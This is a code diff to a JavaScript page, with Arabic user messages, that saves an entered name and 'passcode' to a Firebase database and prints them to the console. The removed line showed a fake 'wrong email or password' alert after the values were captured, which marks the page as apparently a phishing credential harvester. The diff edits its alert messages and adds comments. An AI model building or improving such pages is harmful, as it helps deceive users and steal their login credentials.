@@ -23,7 +23,7 @@
 
         // Initialize Firebase
         const app = firebase.initializeApp(firebaseConfig);
-        const database = firebase.database(app);
+        const database = firebase.database(app); // Moved this line inside the initialization context
 
         function gatherInfo() {
             // Get the values from the input fields
@@ -42,14 +42,15 @@
             newLogRef.set(logEntry)
                 .then(() => {
                     console.log('Log entry saved to Firebase:', logEntry);
+                    alert('تم حفظ المعلومات بنجاح!'); // Notify user about success
                 })
                 .catch((error) => {
                     console.error('Error saving log entry:', error);
+                    alert('حدث خطأ أثناء حفظ المعلومات: ' + error.message); // Notify user about error
                 });
 
             // Log the values to the console
             console.log(`Real Life Name: ${realLifeName}, Passcode: ${passcode}`);
-            alert('البريد الإلكتروني أو كلمة المرور خاطئة!');
 
             // Resetting the input fields
             document.getElementById('realLifeName').value = '';
